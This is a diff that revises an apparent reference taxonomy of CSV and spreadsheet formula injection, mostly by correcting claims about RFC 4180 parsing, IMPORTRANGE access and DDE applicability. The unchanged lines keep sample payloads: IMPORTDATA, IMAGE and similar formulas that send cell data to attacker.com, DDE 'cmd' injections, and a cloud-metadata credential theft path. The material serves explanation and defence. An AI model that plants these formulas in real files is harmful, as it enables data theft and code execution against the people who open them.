@@ -44,7 +44,7 @@ These characters are less commonly documented but can initiate formula interpret
 |---|---|---|---|
 | **Tab character** | `0x09` | When placed at the start of a cell value inside a quoted CSV field, certain spreadsheet applications strip the tab and evaluate the remaining content as a formula | Application-dependent; particularly relevant when tab is used as a sanitization prefix and then removed on re-save |
 | **Carriage return** | `0x0D` | Similar to tab — can be stripped during parsing, exposing the formula trigger character that follows | Application-dependent; added to OWASP guidance alongside tab |
-| **Newline in quoted field** | `0x0A` | When a CSV field is quoted and contains a newline, the content after the newline may begin a new logical cell in some parsers, enabling injection in what appears to be a single field | Parser-dependent; exploits differences in RFC 4180 compliance |
+| **Newline in quoted field** | `0x0A` | Per RFC 4180, a newline inside a quoted field is part of the same field — not a new row. However, some non-compliant parsers or spreadsheet importers incorrectly split the field at the newline, creating a new logical cell/row where a formula trigger character can appear. This is a parser bug, not standard CSV behavior | Non-RFC-4180-compliant parser or importer that splits quoted fields at newlines |
 
 ### §1-3. Compound Trigger Patterns
 
@@ -115,7 +115,7 @@ Google Sheets provides a family of `IMPORT*` functions designed for legitimate d
 | **IMPORTHTML** | `=IMPORTHTML("http://attacker.com/?d="&A1, "table", 1)` — similar exfiltration vector disguised as an HTML table import. | Google Sheets + user authorization. |
 | **IMPORTFEED** | `=IMPORTFEED("http://attacker.com/feed?d="&A1)` — requests an RSS/Atom feed with embedded stolen data. | Google Sheets + user authorization. |
 | **IMPORTDATA** | `=IMPORTDATA("http://attacker.com/data?d="&A1)` — retrieves CSV/TSV data from a URL, transmitting cell content in the request. Used for **live-streaming exfiltration**: when cell values change, the formula re-evaluates and sends updated data. | Google Sheets + user authorization. Enables continuous monitoring when the sheet remains open. |
-| **IMPORTRANGE** | `=IMPORTRANGE("spreadsheet_url", "Sheet1!A1:D10")` — accesses data from another Google Sheets document. Can be used to exfiltrate data across organizational boundaries if the target spreadsheet is shared. | Requires the target spreadsheet to grant access. Cross-tenant data leakage vector. |
+| **IMPORTRANGE** | `=IMPORTRANGE("spreadsheet_url", "Sheet1!A1:D10")` — accesses data from another Google Sheets document. Per Google documentation, requires explicit access grant from the target spreadsheet owner on first connection, plus the requesting user must have at least view access to the target. Not a standalone cross-tenant exfiltration vector — requires pre-existing access or social engineering to obtain the access grant. | Requires target spreadsheet sharing permission + explicit access grant on first use. |
 | **IMAGE** | `=IMAGE("http://attacker.com/pixel.png?d="&A1)` — loads an image from a URL constructed with stolen data. The tracking pixel pattern enables silent exfiltration via image request. | Google Sheets. The image request occurs automatically. |
 
 ---
@@ -207,7 +207,7 @@ The most feature-rich and most targeted application. Attack surface includes DDE
 | **HYPERLINK** | Click-triggered data exfiltration (§2-1) | All versions. No security prompt. |
 | **ENCODEURL** | URL encoding for exfiltration payloads (§2-2) | Available since Excel 2013. |
 | **Power Query** | External data connections that fetch remote data on open | Can be configured to auto-refresh. Enterprise environments may have this enabled. |
-| **MSHTML engine** | ActiveX controls rendered within Office documents (CVE-2021-40444) | Exploitable for RCE through crafted documents. Patched but relevant for understanding attack surface. |
+| **MSHTML engine** | ActiveX controls rendered within Office documents (CVE-2021-40444) | Note: this is a separate Office document exploitation chain (malicious ActiveX/MSHTML), not a CSV/formula injection technique. Included for Office attack surface context, but belongs to a different vulnerability class. Patched. |
 
 ### §5-2. LibreOffice Calc
 
@@ -232,7 +232,7 @@ No DDE or local file access, but the `IMPORT*` function family provides powerful
 | **IMPORTDATA** | Live-streaming exfiltration (§2-5) | Re-evaluates on cell changes, enabling continuous data monitoring. |
 | **IMPORTRANGE** | Cross-spreadsheet data access (§2-5) | Requires target spreadsheet sharing permission. |
 | **IMAGE** | Silent tracking pixel exfiltration (§2-5) | Image load occurs automatically. |
-| **CSV import bypass** | Google Sheets' sanitization (apostrophe prefix) applied to Google Forms responses is **not** applied when importing CSV files directly, leaving formulas active. | Inconsistent sanitization between input channels. |
+| **CSV import bypass** | Google Sheets may apply different sanitization behavior (e.g., apostrophe prefix) for Google Forms responses vs. direct CSV imports, potentially leaving formulas active in CSV imports. (Specific behavior not confirmed via official Google documentation — verification needed.) | Inconsistent sanitization between input channels (if confirmed). |
 
 ---
 
@@ -244,7 +244,7 @@ A distinct and increasingly important attack class where **the server — not th
 
 | Subtype | Mechanism | Key Condition |
 |---|---|---|
-| **PDF/Image conversion** | Web applications that accept uploaded CSV/XLSX files and convert them to PDF or image format (for preview, printing, or archival) often use headless instances of LibreOffice or Excel to perform the conversion. During rendering, formulas are evaluated, and any WEBSERVICE/DDE calls execute on the server. | Application uses LibreOffice/Excel as a conversion engine. |
+| **PDF/Image conversion** | Web applications that accept uploaded CSV/XLSX files and convert them to PDF or image format (for preview, printing, or archival) often use headless instances of LibreOffice to perform the conversion. During rendering, formulas like WEBSERVICE may be evaluated, enabling server-side SSRF. Note: DDE-based OS command execution is Windows/Excel-specific and does not apply to typical headless LibreOffice/Linux conversion pipelines. | Application uses LibreOffice/Excel as a conversion engine; DDE RCE requires Windows + Excel + DDE enabled. |
 | **Report generation** | Applications that import spreadsheet data to generate reports may evaluate formulas to compute derived values. If user-controlled cells contain injected formulas, they execute in the server's context with server-level network access and file permissions. | Application evaluates formulas rather than treating all imports as literal text. |
 | **Real-time evaluation** | G-Suite integrated applications that export user data to Google Sheets may trigger formula re-evaluation whenever the sheet is accessed by an administrator. Injected `IMPORTDATA` formulas provide continuous streaming of updated data to the attacker. | G-Suite/Google Sheets integration with auto-refresh. |
 | **Cloud metadata via SSSI** | When server-side conversion runs on a cloud instance (EC2, GCE, Azure VM), injected formulas can access instance metadata endpoints (`http://169.254.169.254/...`), exfiltrating IAM credentials, instance identity documents, and environment variables. Post-exploitation of stolen cloud credentials can escalate to full infrastructure compromise. | Server runs on a cloud instance with accessible metadata service. |
@@ -281,7 +281,7 @@ The file format used to deliver the injected payload affects which techniques ar
 | **Unquoted injection** | `malicious_name,=cmd\|'/C calc'!A0,other_data` — the formula appears as a bare field value in the CSV. Most spreadsheet applications interpret the `=` prefix directly. | Simplest case. No quoting or escaping to overcome. |
 | **Quoted field injection** | `"normal","=cmd\|'/C calc'!A0","data"` — the formula is within a quoted CSV field. The spreadsheet application strips the quotes and evaluates the formula. | RFC 4180-compliant parsers strip quotes and pass content directly. |
 | **Field separator confusion** | Injecting commas or semicolons within a quoted field to manipulate column alignment, causing the formula to appear in a different column than expected by sanitization logic. | Affects applications that sanitize specific columns (e.g., "only sanitize the name column") rather than all fields. |
-| **Multi-line field injection** | `"normal\n=cmd\|'/C calc'!A0"` — a newline within a quoted CSV field creates a new row in the spreadsheet, where the formula begins on a fresh line with a trigger character. | Parser must support multi-line quoted fields per RFC 4180. |
+| **Multi-line field injection** | `"normal\n=cmd\|'/C calc'!A0"` — a newline within a quoted CSV field. Per RFC 4180, this is a single field containing a literal newline. However, non-compliant parsers may split it into a new row where the formula trigger fires. | Non-compliant parser that incorrectly splits quoted multi-line fields into separate rows. |
 
 ### §7-2. TSV (Tab-Separated Values)
 
@@ -307,14 +307,14 @@ The file format used to deliver the injected payload affects which techniques ar
 | **Client-side data theft** | User opens exported file; formulas auto-exfiltrate | §1 + §2-2 (WEBSERVICE) or §2-5 (IMPORT*) | Auto-execute or click |
 | **Client-side SSRF** | Victim on internal network; WEBSERVICE probes internal services | §1 + §2-2 + §3-2 | Auto-execute |
 | **Client-side file read** | Victim opens CSV in LibreOffice; local files extracted | §1 + §3-1 + §2-4 (DNS exfil) | Auto-execute |
-| **Server-side RCE** | Application processes uploaded XLSX server-side | §6-1 + §2-1 (if DDE enabled on server) | None (automated) |
+| **Server-side RCE** | Application processes uploaded XLSX server-side with DDE-capable engine | §6-1 + §2-1 (requires Windows + Excel/DDE-enabled engine — not typical for headless LibreOffice/Linux) | None (automated, but environment-specific) |
 | **Server-side XXE** | XLSX upload parsed by vulnerable library | §6-2 | None (automated) |
 | **Server-side SSRF** | Server evaluates WEBSERVICE formula during conversion | §6-1 + §2-2 + §3-2 (metadata) | None (automated) |
 | **Cloud credential theft** | SSSI on cloud instance → metadata → IAM credentials | §6-1 + §3-2 | None (automated) |
 | **Log poisoning chain** | Attacker poisons logs → admin exports CSV → formula fires | §6-3 + §1 + §2/§2 | Indirect (admin opens export) |
-| **Cross-tenant data leak** | Google Sheets IMPORTRANGE across organizational boundaries | §2-5 (IMPORTRANGE) | Authorization prompt |
+| **Cross-spreadsheet data access** | Google Sheets IMPORTRANGE requires target owner access grant + viewer permission — not a standalone cross-tenant exfiltration | §2-5 (IMPORTRANGE) | Authorization prompt + access grant |
 | **Phishing via spreadsheet** | HYPERLINK formula disguised as legitimate link | §2-1 + social engineering | Click |
-| **Supply chain** | Vulnerable CSV library ships without sanitization | §6-2, §7-3 | Depends on consumer |
+| **Supply chain** | Vulnerable CSV library ships without formula neutralization | §7-1 (export sink sanitization failure) | Depends on consumer |
 | **Financial transaction manipulation** | Delimiter injection in financial messaging fields alters transaction parameters | §6-3 (Financial messaging) | None (server-side) |
 
 ---
